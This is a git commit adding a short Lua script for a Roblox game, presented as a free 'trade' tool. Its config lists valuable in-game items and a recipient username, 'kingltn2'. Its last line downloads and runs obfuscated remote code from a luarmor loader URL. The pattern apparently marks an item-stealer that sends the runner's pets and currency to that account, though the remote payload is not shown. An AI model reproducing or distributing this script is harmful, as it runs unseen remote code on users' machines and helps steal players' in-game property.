f0eb7749a15b931e8bca2490384b14ee06c8323f
Kingltnn <108787320+Kingltnn@users.noreply.github.com>
2025-03-24 00:00:58 +0700

    Create trade.lua

---
+++ trade.lua
@@ -0,0 +1,26 @@
+-- Is Obfuscated but free!
+
+getgenv().Trader = {
+    ["Items"] = {
+        ["Currency"] = {
+            ["Diamonds"] = { pt = nil, sh = nil, tn = nil },
+        },
+        ["Egg"] = {
+            ["Huge Machine Egg 4"] = { pt = nil, sh = nil, tn = nil },
+        },
+        ['Items'] = {
+            ['Lootbox'] = {
+                ['Mining Coins Booster'] = { pt = nil, sh = nil, tn = nil },
+                ['Mining Speed Booster'] = { pt = nil, sh = nil, tn = nil },
+                ['Mining Damage Booster'] = { pt = nil, sh = nil, tn = nil },
+                ['Amethyst Gem'] = { pt = nil, sh = nil, tn = nil },
+                ['Emerald Gem'] = { pt = nil, sh = nil, tn = nil },
+                ['Sapphire Gem'] = { pt = nil, sh = nil, tn = nil },
+                ['Ruby Gem'] = { pt = nil, sh = nil, tn = nil },
+        
+           },
+        },
+    ['Usernames'] = {"kingltn2"},
+    ['All Pets'] = {"Huge", "Titanic"}, -- Add general pet types or specific names
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b19b14b49f5ce19867b84dbac8171333.lua"))()
